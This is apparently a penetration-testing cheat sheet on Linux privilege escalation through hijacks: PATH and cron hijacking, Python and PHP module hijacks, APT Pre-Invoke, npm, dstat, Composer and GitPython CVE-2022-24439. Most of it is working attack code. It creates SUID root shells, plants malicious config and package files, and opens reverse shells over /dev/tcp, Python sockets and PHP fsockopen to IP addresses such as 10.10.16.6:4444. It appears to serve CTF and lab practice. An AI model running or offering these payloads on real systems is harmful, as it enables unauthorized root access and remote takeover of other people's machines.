---
icon: dagger
---

# Hijacks

{% hint style="info" %}
## <mark style="color:orange;">`PATH`</mark> <mark style="color:purple;">Hijacking</mark>

<mark style="color:purple;">When a script is executed with elevated privileges (e.g., via</mark> <mark style="color:orange;">**`sudo`**</mark> <mark style="color:purple;">or in a</mark> <mark style="color:orange;">**`cron`**</mark> <mark style="color:purple;">job) and calls other binaries or scripts with</mark> <mark style="color:orange;">**`relative paths`**</mark><mark style="color:purple;">, it may be possible to hijack the execution flow by manipulating the</mark> <mark style="color:orange;">**`PATH`**</mark> <mark style="color:purple;">variable or exploiting relative paths.</mark>

{% code title="Check $PATH" %}
```sh
echo $PATH
```
{% endcode %}

***

### <mark style="color:orange;">`PATH`</mark> <mark style="color:purple;">Hijacking with</mark> <mark style="color:orange;">`sudo`</mark> <mark style="color:purple;">:</mark>

{% code title="Lists allowed commands" %}
```bash
sudo -l
```
{% endcode %}

* <mark style="color:purple;">Sometimes is possible to run scripts as</mark> <mark style="color:orange;">**`sudo`**</mark> <mark style="color:purple;">that call others scripts within the script.</mark>
* <mark style="color:purple;">When this scripts are called by a relative path is possible to create a malicious script on a directory with write permissions.</mark>
* <mark style="color:purple;">This commands creates a script named</mark> <mark style="color:orange;">**`initdb.sh`**</mark> <mark style="color:purple;">that  will copy</mark> <mark style="color:orange;">**`bash`**</mark> <mark style="color:purple;">to a file in the</mark> <mark style="color:orange;">**`/tmp`**</mark> <mark style="color:purple;">folder, when called for execution:</mark>

{% code overflow="wrap" %}
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/shellie\nchown root:root /tmp/shellie\nchmod 6777 /tmp/shellie' | tee initdb.sh
```
{% endcode %}

* <mark style="color:purple;">Once the  malicious script is executed by the vulnerable script, you just need to execute the shell from the</mark> <mark style="color:orange;">**`/tmp`**</mark> <mark style="color:purple;">folder to become</mark> <mark style="color:orange;">**`root`**</mark><mark style="color:purple;">:</mark>

```bash
/tmp/shellie -p
```

***

### <mark style="color:purple;">Path Hijacking in</mark> <mark style="color:orange;">`cron`</mark> <mark style="color:purple;">job:</mark>

* <mark style="color:purple;">When</mark> <mark style="color:orange;">**`PATH`**</mark> <mark style="color:purple;">includes</mark> <mark style="color:orange;">**`/usr/local/bin`**</mark> <mark style="color:purple;">before</mark> <mark style="color:orange;">**`/usr/bin`**</mark> <mark style="color:purple;">in the</mark> <mark style="color:orange;">**`cron`**</mark> <mark style="color:purple;">job's environment.</mark>&#x20;
* <mark style="color:purple;">There is an opportunity for</mark> <mark style="color:orange;">**`PATH hijacking`**</mark> <mark style="color:purple;">if a binary or script is executed</mark> <mark style="color:orange;">**`without using an absolute path`**</mark><mark style="color:purple;">**.**</mark>
* <mark style="color:purple;">By placing a malicious binary in a directory earlier in the</mark> <mark style="color:orange;">**`PATH`**</mark> <mark style="color:purple;">(e.g.,</mark> <mark style="color:orange;">**`/usr/local/bin`**</mark><mark style="color:purple;">), you can hijack the execution flow.</mark>

{% code overflow="wrap" %}
```sh
echo -e '#!/bin/bash\n\ncp /bin/bash /bin/shellie\nchmod u+s /bin/shellie' > /usr/local/bin/run-parts; chmod +x /usr/local/bin/run-parts
```
{% endcode %}

* <mark style="color:orange;">**`bash`**</mark> <mark style="color:purple;">drops</mark> <mark style="color:orange;">**`SUID`**</mark> <mark style="color:purple;">privileges by default, so make sure to run it with</mark> <mark style="color:orange;">**`-p`**</mark> <mark style="color:purple;">to keep root:</mark>

```bash
shellie -p
```

***

### <mark style="color:purple;">Path Hijack in</mark> <mark style="color:orange;">`supervisord.pid`</mark> <mark style="color:purple;">:</mark>

* <mark style="color:purple;">Supervisor it’s a process management tool for keeping services running.</mark>
* <mark style="color:purple;">Each managed process must have a</mark> <mark style="color:orange;">**`[program:<name>]`**</mark> <mark style="color:purple;">line followed by another line</mark> <mark style="color:orange;">**`command=`**</mark> <mark style="color:purple;">where you should place the payload:</mark>

{% code overflow="wrap" %}
```bash
echo -e "[program:memcached]\ncommand = bash -c 'bash -i  >& /dev/tcp/10.10.16.6/4444 0>&1'" > memcached.ini
```
{% endcode %}

***

### <mark style="color:green;">`Python`</mark> <mark style="color:purple;">Path Hijacking</mark>

* <mark style="color:purple;">Sometimes python scripts are being executed by</mark> <mark style="color:orange;">**`cron`**</mark> <mark style="color:purple;">jobs or by other scripts with</mark> <mark style="color:orange;">**`sudo`**</mark> <mark style="color:purple;">permissions:</mark>

{% code title="Look for writable modules" overflow="wrap" %}
```bash
find /usr/lib/python* -type f -writable -ls 2>&1 | grep python
```
{% endcode %}

{% code title="Look in virtual environments" overflow="wrap" %}
```bash
find /path/to/venv -type f -writable -ls 2>&1 | grep python
```
{% endcode %}

{% code title="Look in the entire system" overflow="wrap" %}
```bash
find -type f -writable -ls 2>&1 | grep python
```
{% endcode %}

* <mark style="color:purple;">Check the python</mark> <mark style="color:orange;">**`PATH`**</mark> <mark style="color:purple;">order:</mark>

```bash
python -c 'import sys; print "\n".join(sys.path)'
```

* <mark style="color:purple;">Here is a example of a reverse shell to hijack the</mark> <mark style="color:orange;">**`os`**</mark> <mark style="color:purple;">module:</mark>

```bash
echo 'import pty
import socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.6",4444))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)
pty.spawn("/bin/bash")
s.close()' >> os.py
```

* <mark style="color:purple;">When a module is imported you can create a malicious module on the same directory where the vulnerable script is and python will import the malicious module instead:</mark>

{% code overflow="wrap" %}
```python
import pty

pty.spawn("/bin/bash")
```
{% endcode %}

***

### <mark style="color:orange;">`sudo`</mark> <mark style="color:purple;">via</mark> <mark style="color:orange;">`PHP Cronjob`</mark>

* <mark style="color:purple;">Use this reverse shell to hijack</mark> <mark style="color:orange;">**`PHP`**</mark> <mark style="color:purple;">files being used with</mark> <mark style="color:orange;">**`sudo`**</mark> <mark style="color:purple;">privileges by a</mark> <mark style="color:orange;">**`cron`**</mark> <mark style="color:purple;">job or another script:</mark>

```php
$sock=fsockopen("10.10.16.8", 4445);
exec("/bin/sh -i <&3 >&3 2>&3");
```

***

### <mark style="color:orange;">`sudo`</mark> <mark style="color:purple;">via</mark> <mark style="color:orange;">`Symlink`</mark>

```sh
ln -s /root/root.txt t.trace.db
```

***

### <mark style="color:purple;">Path Hijacking via</mark> <mark style="color:orange;">`doas`</mark>&#x20;

* <mark style="color:orange;">**`doas`**</mark> <mark style="color:purple;">is a lightweight, simple command-line utility for running commands with elevated privileges on Unix-like systems, similar to</mark> <mark style="color:orange;">**`sudo`**</mark><mark style="color:purple;">**.**</mark>
* <mark style="color:orange;">**`doas.conf`**</mark> <mark style="color:purple;">have important information for privilege escalation:</mark>

```sh
find / -name "doas.conf" 2>/dev/null
```

***

### <mark style="color:purple;">**Path Hijacking via**</mark>**&#x20;**<mark style="color:orange;">**`sudo -i`**</mark>

* <mark style="color:purple;">If there is a</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**writable directory in the**</mark>**&#x20;**<mark style="color:orange;">**`$PATH`**</mark> <mark style="color:purple;">(e.g.,</mark> <mark style="color:orange;">**`/tmp`**</mark> <mark style="color:purple;">or</mark> <mark style="color:orange;">**`/home/user/`**</mark><mark style="color:purple;">), and an attacker can control the contents of this directory.</mark>
* <mark style="color:purple;">First, create a malicious</mark> <mark style="color:orange;">**`bash`**</mark> <mark style="color:purple;">script in</mark> <mark style="color:orange;">**`/tmp/bash`**</mark><mark style="color:purple;">:</mark>

```sh
cp /bin/bash .
```

* <mark style="color:purple;">Then on the vulnerable</mark> <mark style="color:orange;">**`$PATH`**</mark> <mark style="color:purple;">**just run:**</mark>

```sh
sudo -i
```

***

### <mark style="color:orange;">`sudo`</mark> <mark style="color:purple;">via</mark> <mark style="color:orange;">`PHP`</mark>

* <mark style="color:purple;">If is possible to user</mark> <mark style="color:orange;">**`PHP`**</mark> <mark style="color:purple;">with</mark> <mark style="color:orange;">**`sudo`**</mark><mark style="color:purple;">:</mark>

```sh
sudo /usr/bin/php -r 'system("/bin/sh");'
```
{% endhint %}

***

{% hint style="info" %}
### <mark style="color:purple;">Hijack</mark> <mark style="color:orange;">`APT`</mark>

#### <mark style="color:orange;">`Pre-Invoke`</mark>

* <mark style="color:purple;">Create a malicious config file to be invoked before</mark> <mark style="color:orange;">**`APT`**</mark> <mark style="color:purple;">runs:</mark>

{% code overflow="wrap" %}
```sh
echo 'APT::Update::Pre-Invoke {"bash -c '\''bash -i >& /dev/tcp/192.168.0.10/4433 0>&1'\''"}' > file_name
```
{% endcode %}

* <mark style="color:orange;">**`APT`**</mark> <mark style="color:purple;">check this directory for</mark> <mark style="color:orange;">**`pre-invoke`**</mark> <mark style="color:purple;">scripts:</mark>

```
/etc/apt/apt.conf.d
```

* <mark style="color:purple;">Just wait for listener.</mark>
{% endhint %}

***

{% hint style="info" %}
### <mark style="color:orange;">`npm`</mark> <mark style="color:purple;">via</mark> <mark style="color:orange;">`sudo`</mark>

* <mark style="color:purple;">A</mark> <mark style="color:orange;">**`NodeJS`**</mark> <mark style="color:purple;">package is defined in a file</mark> <mark style="color:orange;">**`package.json`**</mark><mark style="color:purple;">, is possible to create a malicious package and run it with the</mark> <mark style="color:orange;">**`--unsafe`**</mark> <mark style="color:purple;">option to get code execution:</mark>

```json
{
  "name": "root_please",
  "version": "1.0.0",
  "scripts": {
    "preinstall": "/bin/bash"
  }
}
```

* <mark style="color:purple;">The malicious</mark> <mark style="color:orange;">**`package.json`**</mark> <mark style="color:purple;">needs to be contain within the fake package directory; once is all setup just run it with</mark> <mark style="color:orange;">**`sudo`**</mark><mark style="color:purple;">:</mark>

```sh
sudo npm i package/ --unsafe
```
{% endhint %}

***

{% hint style="info" %}
### <mark style="color:orange;">`dstat`</mark> <mark style="color:purple;">Plugin poisoning</mark>

<mark style="color:purple;">Allows to run arbitrary</mark> [<mark style="color:green;">**`python`**</mark>](https://gtfobins.github.io/gtfobins/python/) <mark style="color:purple;">scripts loaded as “external plugins” if they are located in one of the directories stated in the</mark> <mark style="color:orange;">**`man`**</mark> <mark style="color:purple;">page:</mark>

1. <mark style="color:red;">**`~/.dstat/`**</mark>
2. <mark style="color:red;">**`(path of binary)/plugins/`**</mark>
3. <mark style="color:red;">**`/usr/share/dstat/`**</mark>
4. <mark style="color:red;">**`/usr/local/share/dstat`**</mark>

<mark style="color:purple;">Normally to escalate privilege you want to choose the ones within the</mark> <mark style="color:orange;">**`root`**</mark> <mark style="color:purple;">path, check for</mark> <mark style="color:orange;">**`writable`**</mark> <mark style="color:purple;">permissions:</mark>

{% code lineNumbers="true" %}
```sh
ls -ld /usr/local/share/dstat/
ls -ld /usr/share/dstat/
```
{% endcode %}

<mark style="color:purple;">Create a malicious plugin:</mark>

{% code overflow="wrap" lineNumbers="true" %}
```sh
echo -e 'import os\n\nos.system("/bin/bash")' > /usr/local/share/dstat/dstat_tokyo.py
echo 'import os; os.execv("/bin/sh", ["sh"])' > ~/.dstat/dstat_tokyo.py
```
{% endcode %}

<mark style="color:purple;">Execute it with</mark> <mark style="color:orange;">**`--PluginName`**</mark><mark style="color:purple;">:</mark>

{% code lineNumbers="true" %}
```sh
doas /usr/bin/dstat --tokyo
sudo dstat --tokyo
```
{% endcode %}
{% endhint %}

***

{% hint style="info" %}
### <mark style="color:orange;">`Composer`</mark> <mark style="color:purple;">Hijacking</mark>

* <mark style="color:purple;">First create the temporal folder where you will invoke the shell from and save in an environmental variable:</mark>&#x20;

```sh
TF=$(mktemp -d)
```

* <mark style="color:purple;">Once is done, create the malicious script to feed</mark> <mark style="color:orange;">**`composer`**</mark><mark style="color:purple;">:</mark>&#x20;

```sh
echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' >$TF/composer.json
```

* <mark style="color:purple;">Finally, just execute the script with it's in-build option:</mark>

```sh
sudo composer --working-dir=$TF run-script x
```
{% endhint %}

***

{% hint style="info" %}
### <mark style="color:orange;">`GitPython`</mark>

<mark style="color:red;">**`CVE-2022-24439`**</mark>

* <mark style="color:purple;">Inadequate validation of user input when handling remote URLs passed to the clone command:</mark>

{% code title="Create the reverse shell" overflow="wrap" %}
```sh
echo "bash -i >& /dev/tcp/10.10.16.10/4444 0>&1" > /tmp/shell.sh
```
{% endcode %}

{% code title="Payload" overflow="wrap" %}
```sh
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c bash% /tmp/shell.sh'
```
{% endcode %}
{% endhint %}

